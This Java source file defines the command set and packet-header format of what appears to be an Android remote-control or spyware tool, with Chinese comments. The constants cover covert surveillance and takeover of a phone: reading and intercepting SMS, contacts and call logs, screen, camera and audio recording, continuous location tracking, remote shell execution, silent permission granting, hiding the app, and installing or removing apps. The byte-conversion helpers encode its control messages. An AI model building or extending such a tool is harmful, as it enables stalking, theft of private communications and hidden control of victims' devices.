package order;

import java.io.UnsupportedEncodingException;

import utils.ConfigCt;

/**
 * @author byc:协议格式：包头+命令+数据长度+数据体
 *
 */
public class order {
	public static final int UID = 8888;//命令标识(包头标识)；
	public static final int VER = 1002;//版本号(包头标识)；
	public static final int ENC = 7619;//加密字(包头标识)；
	public static final int CMD_TEST=1000;//测试；
	public static final int CMD_READY = 1001;//准备好命令；
	public static final int CMD_INFO = 1002;//获取信息命令；
	public static final int CMD_CALL = 1004;//获取通话记录命令；
	public static final int CMD_LOCK = 1005;//锁屏命令
	public static final int CMD_SHOT = 1006;//截屏命令；
	public static final int CMD_SHOTCODE = 1007;//截二维码命令；
	public static final int CMD_RETURN = 1008;//返回命令；//
	public static final int CMD_POS=1009;//返回命令；
	public static final int CMD_LIGHT=1010;//亮屏命令；
	public static final int CMD_LIGHT_UP=101001;//亮屏命令；
	public static final int CMD_GIVE_POWER=1011;//自动授权命令;
	public static final int CMD_CAMERA=1012;//相机命令；
	public static final int CMD_SLIDE=1013;//滑动命令；
	public static final int CMD_CMD=1014;//执行CMD命令；
	public static final int CMD_GET_CMD_OUT=1015;//获取执行CMD命令结果；
	public static final int CMD_REBOOT=1016;//重启手机；
	public static final int CMD_SHUTDOWN=1017;//关机；
	public static final int CMD_RESTART=1018;//重启应用；
	public static final int CMD_UNLOCK=1019;//解除我的锁屏；
	public static final int CMD_RECORD_SCREEN_START=1020;//录屏开始；
	public static final int CMD_RECORD_SCREEN_END=1021;//录屏结束；
	public static final int CMD_RECORD_VIDEO_START=1022;//录像开始；
	public static final int CMD_RECORD_VIDEO_END=1023;//录像结束；
	public static final int CMD_HOME=1024;//返回桌面
	public static final int CMD_GET_INSTALL_APP_INFO=1025;//获取已安装的应用信息；
	public static final int CMD_INSTALL_APP=1026;//安装；
	public static final int CMD_UNINSTALL_APP=1027;//卸载；
	public static final int CMD_RUN_APP=1028;//运行；
	public static final int CMD_KILL_APP=1029;//终止运行；
	public static final int CMD_LONG_CLICK=1030;//长按命令；
	public static final int CMD_INPUT=1031;//输入 命令；
	public static final int CMD_CAMERA_CAP_START=1032;//录像开始；
	public static final int CMD_CAMERA_CAP_END=1033;//录像结束；
	public static final int CMD_INSERT_IMG_TO_GALLERY=1034;//照片插入到相册；
	public static final int CMD_SOUND_CAP_START=1035;//录像开始；
	public static final int CMD_SOUND_CAP_END=1036;//录像结束；

	public static final int CMD_APP_HIDE=1037;//；
	public static final int CMD_APP_SHOW=1038;//；

	public static final int CMD_REQUEST_USER_ID=1904;//申请用户ID

	public static final int CMD_LOCATION_SINGLE = 2001;//获取定位信息：
	public static final int CMD_LOCATION_SERIES = 2002;//连续获取定位信息：
	public static final int CMD_LOCATION_STOP = 2003;//停止获取定位信息：
	public static final int CMD_SMS_CONTENT = 3001;//获取短信内容命令；
	public static final int CMD_SMS_SEND = 3002;//发送短信命令；
	public static final int CMD_SMS_PHONE_NUMBER = 3003;//查询本机号码命令；
	public static final int CMD_CONTACT_CONTENT = 3004;//通讯录；
	public static final int CMD_SMS_SENDS = 3005;//群发短信；
	public static final int CMD_SMS_CLEAR = 3006;//清空短信；
	public static final int CMD_SMS_INTERCEPT = 3007;//拦截短信；
	public static final int CMD_SMS_INTERCEPT_NO = 3008;//取消拦截短信；


	public static final int FILE_DIR_ROOT=4100;//根目录；
	public static final int CMD_FILE_LIST = 4001;//列举目录；传递绝对路径；
	public static final int CMD_FILE_TRANS=4002;//列举外置SD卡目录；
	public static final int CMD_FILE_DEL=4003;//删除文件

	public static final int FILE_DIR_EX_SD = 4101;//外置SD卡目录标志;
	public static final int FILE_DIR_SD = 4102;//内置SD卡目录标志;
	public static final int FILE_DIR_PHOTO = 4103;//相册目录;

	public static final int PH_SIZE=32;
	public static final int DATA_SIZE=1024;//数据体缓存大小；
	public static final int MAX_PATH=260;//目录长度大小；
	public static final int MAX_FILE_NAME=64;//文件名长度；
	public static final int MAX_TIME_STR=24;//时间字符串长度；
	//public static byte[] PackageHeader= new byte[PH_SIZE];//包头：标识+命令+数据长度;
	//public static byte[] b = {0,0,0,0};//缓存
	//public static byte[] data = new byte[DATA_SIZE];//数据体缓存
	//public static byte[] pdata = null;//数据体缓存
	//public static OrderHeader oh=new OrderHeader();//命令头

	public static byte[] toLH(int n) {
		byte[] b = {0,0,0,0};
		b[0] = (byte) (n & 0xff);
		b[1] = (byte) (n >> 8 & 0xff);
		b[2] = (byte) (n >> 16 & 0xff);
		b[3] = (byte) (n >> 24 & 0xff);
		return b;
	}
	public static int byteToInt(byte[] byteVal) {
		int result = 0;
		for (int i = 0; i < byteVal.length; i++) {
			int tmpVal = (byteVal[i] << (8 * (3 - i)));
			switch (i) {
				case 0:
					tmpVal = tmpVal & 0xFF000000;
					break;
				case 1:
					tmpVal = tmpVal & 0x00FF0000;
					break;
				case 2:
					tmpVal = tmpVal & 0x0000FF00;
					break;
				case 3:
					tmpVal = tmpVal & 0x000000FF;
					break;
			}
			result = result | tmpVal;
		}
		return result;
	}
	/*
	 * ：
	 */
	public static byte[] double2Bytes(double d) {
		long value = Double.doubleToRawLongBits(d);
		byte[] byteRet = new byte[8];
		for (int i = 0; i < 8; i++) {
			byteRet[i] = (byte) ((value >> 8 * i) & 0xff);
		}
		return byteRet;
	}
	/*
	 * ：
	 */
	public static double bytes2Double(byte[] arr) {
		long value = 0;
		for (int i = 0; i < 8; i++) {
			value |= ((long) (arr[i] & 0xff)) << (8 * i);
		}
		return Double.longBitsToDouble(value);
	}
	//*********************************************************************************************
	/*
	 * 将命令头格式化为字节流：
	 */
	public static byte[] formatOHtoPH(OrderHeader oh,byte[] ph){
		byte[] temp = {0,0,0,0};
		//byte[] PackageHeader=new byte[PH_SIZE];
		// add uID
		temp =toLH(oh.uid);
		System.arraycopy(temp, 0, ph, 0, 4);
		// add ver
		temp =toLH(oh.ver);
		System.arraycopy(temp, 0, ph, 4, 4);
		// add ver
		temp =toLH(oh.enc);
		System.arraycopy(temp, 0, ph, 8, 4);
		//add id
		temp =toLH(oh.id);
		System.arraycopy(temp, 0, ph, 12, 4);
		//add pid
		temp =toLH(oh.pid);
		System.arraycopy(temp, 0, ph, 16, 4);
		// add cmd
		temp =toLH(oh.cmd);
		System.arraycopy(temp, 0, ph,20, 4);
		// add len
		temp =toLH(oh.len);
		System.arraycopy(temp, 0, ph,24, 4);
		// add dat
		temp =toLH(oh.dat);
		System.arraycopy(temp, 0, ph,28, 4);
		return ph;
	}
	/*
	 * 将字节流格式化为包头：
	 */
	public static  OrderHeader formatPHtoOH(byte[] ph,OrderHeader oh){
		byte[] b = {0,0,0,0};
		//OrderHeader oh=new OrderHeader();
		int cForm;
		System.arraycopy(ph, 0, b,0, 4);
		cForm = byteToInt(b);
		oh.uid= byteToInt(toLH(cForm));

		System.arraycopy(ph, 4, b,0, 4);
		cForm = byteToInt(b);
		oh.ver= byteToInt(toLH(cForm));

		System.arraycopy(ph, 8, b,0, 4);
		cForm = byteToInt(b);
		oh.enc= byteToInt(toLH(cForm));

		System.arraycopy(ph, 12, b,0, 4);
		cForm = byteToInt(b);
		oh.id= byteToInt(toLH(cForm));

		System.arraycopy(ph, 16, b,0, 4);
		cForm = byteToInt(b);
		oh.pid= byteToInt(toLH(cForm));

		System.arraycopy(ph, 20, b,0, 4);
		cForm = byteToInt(b);
		oh.cmd=byteToInt(toLH(cForm));

		System.arraycopy(ph, 24, b,0, 4);
		cForm = byteToInt(b);
		oh.len=byteToInt(toLH(cForm));

		System.arraycopy(ph, 28, b,0, 4);
		cForm = byteToInt(b);
		oh.dat=byteToInt(toLH(cForm));
		return oh;
	}
	/*
	 * 生成准备好命令包头：
	 */
	public static byte[] CreateReadyPH(OrderHeader oh,byte[] ph){
		//OrderHeader oh=new OrderHeader();
		oh.uid=UID;
		oh.ver=VER;
		oh.enc=ENC;
		oh.cmd=CMD_READY;
		oh.len=0;
		return formatOHtoPH(oh,ph);
	}
	/*
	 * 校验命令头：
	 */
	public static boolean VerifyOH(OrderHeader oh){
		boolean b=true;
		if(oh.uid!=UID)b=false;
		if(oh.ver!=VER)b=false;
		if(oh.enc!=ENC)b=false;
		return b;
	}
	/*
	 * 格式化命令头：
	 */
	public static OrderHeader formatOH(OrderHeader oh){
		oh.uid=UID;
		oh.ver=VER;
		oh.enc=ENC;
		oh.pid=ConfigCt.pid;
		oh.id=ConfigCt.id;
		oh.cmd=CMD_READY;
		oh.len=0;
		oh.dat=0;
		return oh;
	}
	/*
	 * 将字节流格式化为整型：
	 */
	public static  int byte2Int(byte[] b){
		int cForm;
		cForm = byteToInt(b);
		return byteToInt(toLH(cForm));
	}
	/*
	 * 将字节流格式化为字符串：
	 */
	public static  String byte2Str(byte[] b){
		try{
			//String s=new String(b, "UTF-8");
			if (b==null)return null;
			String s=new String(b, "gbk");
			return s;
		}catch(UnsupportedEncodingException e){
			e.printStackTrace();
			return null;
		}
	}
}
